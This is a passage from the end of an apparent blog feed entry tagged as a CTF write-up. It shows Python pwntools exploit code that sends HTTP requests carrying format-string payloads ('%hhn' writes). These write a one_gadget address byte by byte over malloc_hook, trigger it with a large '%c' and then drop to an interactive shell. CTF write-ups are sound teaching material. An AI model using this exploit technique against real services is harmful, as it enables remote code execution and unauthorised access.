-1\n\x0a"</span></span><br><span class="line"></span><br><span class="line">payload2 += <span class="string">"%"</span> + str(t2) + <span class="string">"c"</span> +<span class="string">"%"</span> + str(<span class="number">31</span>) + <span class="string">'$hhn'</span>  + <span class="string">"a"</span> * <span class="number">10</span> +  p64(malloc_hook+<span class="number">1</span>) + <span class="string">"a"</span> *<span class="number">8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a"</span></span><br><span class="line">payload2 += <span class="string">"%"</span> + str(t2) + <span class="string">"c"</span> +<span class="string">"%"</span> + str(<span class="number">31</span>) + <span class="string">'$hhn'</span>  + <span class="string">"a"</span> * <span class="number">10</span> +  p64(malloc_hook+<span class="number">2</span>) + <span class="string">"a"</span> *<span class="number">8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a"</span></span><br><span class="line">payload2 += <span class="string">"%"</span> + str(t2) + <span class="string">"c"</span> +<span class="string">"%"</span> + str(<span class="number">31</span>) + <span class="string">'$hhn'</span>  + <span class="string">"a"</span> * <span class="number">9</span> +  p64(malloc_hook+<span class="number">3</span>) + <span class="string">"a"</span> *<span class="number">8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">32</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a"</span></span><br><span class="line">payload2 += <span class="string">"%"</span> + str(t2) + <span class="string">"c"</span> +<span class="string">"%"</span> + str(<span class="number">31</span>) + <span class="string">'$hhn'</span>  + <span class="string">"a"</span> * <span class="number">9</span> +  p64(malloc_hook+<span class="number">4</span>) + <span class="string">"a"</span> *<span class="number">8</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">40</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a"</span></span><br><span class="line">payload2 += <span class="string">"%"</span> + str(t2) + <span class="string">"c"</span> +<span class="string">"%"</span> + str(<span class="number">31</span>) + <span class="string">'$hhn'</span>  + <span class="string">"a"</span> * <span class="number">9</span> +  p64(malloc_hook+<span class="number">5</span>) + <span class="string">"a"</span> *<span class="number">8</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a"</span></span><br><span class="line">payload2 += <span class="string">"%1000000c"</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://xibai.xyz/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
  </entry>
  
</feed>
